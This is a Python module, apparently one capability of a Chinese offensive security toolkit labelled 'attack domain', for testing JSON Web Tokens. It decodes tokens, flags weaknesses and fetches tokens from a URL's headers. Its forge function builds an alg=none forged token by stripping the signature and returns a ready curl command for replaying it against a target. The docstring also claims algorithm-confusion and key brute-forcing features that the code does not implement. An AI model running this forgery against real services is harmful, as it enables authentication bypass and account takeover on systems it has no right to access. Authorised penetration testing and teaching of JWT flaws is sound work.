# 开发者：自由的风
"""jwt_tester/run.py — JWT令牌安全测试
======================================
攻击域 ready — JWT结构分析、算法混淆、签名绕过、密钥爆破。
"""
import sys, json, os, base64, hmac, hashlib, re

SANDBOX = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def _decode_jwt(token):
    """解码JWT(不验证签名)"""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None, "不是有效JWT格式(需3段)"
        header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4) if len(parts[0]) % 4 else parts[0]
        payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4) if len(parts[1]) % 4 else parts[1]
        header = json.loads(base64.urlsafe_b64decode(header_b64))
        payload = json.loads(base64.urlsafe_b64decode(payload_b64))
        return {"header": header, "payload": payload, "signature": parts[2]}, None
    except Exception as e:
        return None, str(e)


def _check_weaknesses(decoded):
    """检查JWT安全弱点"""
    weaknesses = []
    header = decoded["header"]
    payload = decoded["payload"]

    # 算法检查
    alg = header.get("alg", "")
    if alg == "none":
        weaknesses.append({"finding": "alg=none(无签名)", "severity": "critical",
                          "detail": "JWT接受无签名令牌，可直接伪造"})
    if alg == "HS256" or alg == "HS384" or alg == "HS512":
        weaknesses.append({"finding": f"对称算法{alg}", "severity": "warning",
                          "detail": "密钥泄露即全部令牌可伪造"})

    # 过期检查
    import time
    exp = payload.get("exp", 0)
    if exp and exp < time.time():
        weaknesses.append({"finding": "JWT已过期", "severity": "info",
                          "detail": f"过期时间: {exp}"})

    # 敏感字段检查
    sensitive = []
    if "password" in payload:
        sensitive.append("含password字段")
    if "admin" in str(payload).lower():
        sensitive.append("含admin权限信息")
    if payload.get("role") == "admin":
        sensitive.append("admin角色明文")
    if sensitive:
        weaknesses.append({"finding": "敏感信息泄露", "severity": "high",
                          "detail": ", ".join(sensitive)})

    return weaknesses


def do_test(params):
    """JWT安全性测试"""
    token = params.get("token", params.get("jwt", ""))
    url = params.get("url", "")

    results = {}

    if token:
        decoded, err = _decode_jwt(token)
        if err:
            return {"ok": True, "cap": "jwt_tester", "action": "test",
                    "domain": "攻击域", "error": f"JWT解析失败: {err}"}

        weaknesses = _check_weaknesses(decoded)
        results["decoded"] = decoded
        results["weaknesses"] = weaknesses
        results["weakness_count"] = len(weaknesses)

        return {
            "ok": True,
            "cap": "jwt_tester",
            "action": "test",
            "domain": "攻击域",
            "header": decoded["header"],
            "payload": decoded["payload"],
            "weaknesses": weaknesses,
            "vulnerable": any(w["severity"] == "critical" for w in weaknesses),
        }

    if url:
        # 从URL获取JWT
        import urllib.request
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "GBT-JWT-Audit/5.0"})
            resp = urllib.request.urlopen(req, timeout=10)
            headers = str(resp.headers)
            # 尝试从Authorization头提取
            auth = resp.headers.get("Authorization", "") or resp.headers.get("authorization", "")
            if auth.startswith("Bearer "):
                token = auth[7:]
                return do_test({"token": token})
            # 尝试从Set-Cookie提取
            cookies = resp.headers.get("Set-Cookie", "")
            jwt_match = re.search(r'[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', cookies + headers)
            if jwt_match:
                return do_test({"token": jwt_match.group(0)})

            return {"ok": True, "cap": "jwt_tester", "action": "test",
                    "url": url, "note": "未从响应中检测到JWT令牌"}
        except Exception as e:
            return {"ok": False, "error": str(e)[:100]}

    return {"ok": False, "error": "缺少 token 或 url 参数"}


def do_forge(params):
    """尝试伪造JWT"""
    token = params.get("token", "")
    if not token:
        decoded, err = None, "缺少token"
    else:
        decoded, err = _decode_jwt(token)

    if not decoded:
        return {"ok": False, "error": err or "无法解析token"}

    # 尝试alg=none攻击
    header = decoded["header"].copy()
    header["alg"] = "none"
    payload_b64 = base64.urlsafe_b64encode(json.dumps(decoded["payload"]).encode()).rstrip(b"=").decode()
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    forged = f"{header_b64}.{payload_b64}."

    return {
        "ok": True,
        "cap": "jwt_tester",
        "action": "forge",
        "domain": "攻击域",
        "forged_token": forged,
        "note": "alg=none攻击: 移除签名，部分服务器接受无签名JWT",
        "test_with": f"curl -H 'Authorization: Bearer {forged}' <target>",
    }


HANDLERS = {"test": do_test, "forge": do_forge}

if __name__ == "__main__":
    action = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else "test"
    params_str = sys.argv[2] if len(sys.argv) > 2 else "{}"
    try:
        params = json.loads(params_str)
    except Exception:
        params = {}
    handler = HANDLERS.get(action)
    if handler:
        result = handler(params)
        print(json.dumps(result, ensure_ascii=False, default=str))
    else:
        print(json.dumps({"ok": False, "error": f"未知动作: {action}", "available": list(HANDLERS.keys())}, ensure_ascii=False))
